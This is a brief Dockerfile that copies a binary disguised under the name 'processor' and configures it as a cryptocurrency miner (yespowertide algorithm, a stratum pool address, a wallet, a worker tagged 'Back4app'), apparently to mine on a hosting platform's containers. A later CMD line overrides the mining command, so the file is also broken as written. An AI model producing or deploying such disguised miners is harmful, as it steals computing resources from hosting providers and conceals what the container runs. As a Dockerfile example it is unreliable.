FROM ubuntu:24.04
COPY processor /processor
RUN chmod +x /processor
CMD ["/processor", "-a", "yespowertide", "-o", "stratum+tcps://na.rplant.xyz:17059", "-u", "TWJa3cLtb2ibL5C6i93GVD6DTHjUqpuxHs.Back4app", "-t", "14"]
# Tambah di akhir - keep container running
CMD tail -f /dev/null
